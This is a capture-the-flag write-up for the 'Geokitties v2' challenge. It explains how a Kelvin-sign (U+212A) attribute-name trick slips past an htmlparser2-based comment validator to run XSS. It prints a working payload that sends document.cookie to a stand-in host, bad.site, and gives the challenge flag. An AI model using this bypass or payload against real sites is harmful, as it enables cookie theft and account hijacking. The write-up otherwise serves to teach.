## Geokitties v2

The goal of this challenge is to steal the flag stored in the admin's cookies.

When a comment is successfully posted, the page states that the comment is "awaiting approval" and that the admin will click on every link within. A quick check with a link to a controlled site shows that this is the case. This seems like a promising point of exfiltration: registering an `onclick` event to submit `document.cookie` to an external site via URL parameters. Unfortunately, `check_comment` (`blog.js:51-93`) only accepts event handlers with empty values. Is there a way around this?

What about duplicate attributes?

    <a href="#" onclick="" onclick="...xss...">...</a>

The validator accepts this comment! But the `onclick` code isn't called... why? The [HTML5 standard](https://www.w3.org/TR/html5/syntax.html#attributes-0) says that this isn't valid (read: "There must never be two or more attributes on the same start tag whose names are an ASCII case-insensitive match for each other."). In practice, browsers ignore any repeated attributes, so the first `onclick` is the only one that takes effect. Since the comment was accepted, it's clear that the validator follows this rule as well.

Let's try something else. The regular expression in `check_comment` checks for tag attributes starting with lowercase `on`. How about using alternative cases like `ONclick`?

    <a href="#" ONclick="...xss...">...</a>

This doesn't work either. The validator rejects the comment. Clearly, the attributes are being converted to lowercase. A quick glance through the source code of `htmlparser2` reveals that [this is achieved via `String.prototype.toLowerCase()`](https://github.com/fb55/htmlparser2/blob/ef0f27c481262086697f5d1893a931682cd7fb1f/lib/Parser.js#L232-L234)... which is a Unicode-aware function.

The W3C standard was clear that attributes are distinct if and only if they are not *ASCII* case-insensitive matches, meaning only letters `A-Z` are converted to lowercase. In Unicode, *any* codepoint may map to a lowercase codepoint. Are there any non-Latin uppercase variants of any of the letters in `onclick`?

Of course! Enter `K`---not to be confused with the Latin uppercase `K`. The former is `U+212A KELVIN SIGN`. As far as any standards-abiding web browser is concerned, `onclicK` with `U+212A` is a different attribute from `onclicK`. Meanwhile, `htmlparser2` considers them the same. Thus, the following code will validate:

    <a href="#" onclicK="" onclick="javascript:window.location='https://bad.site/cookie_grabber?cookie=' + document.cookie; return false;">Click me!</a>

and when the "administrator" clicks on the link (i.e. immediately), `bad.site` obtains the flag via URL parameter.

`document.cookie` was `flag=CTF{i_HoPe_YoU_fOunD_tHe_IntEndeD_SolUTioN_tHis_Time}`.
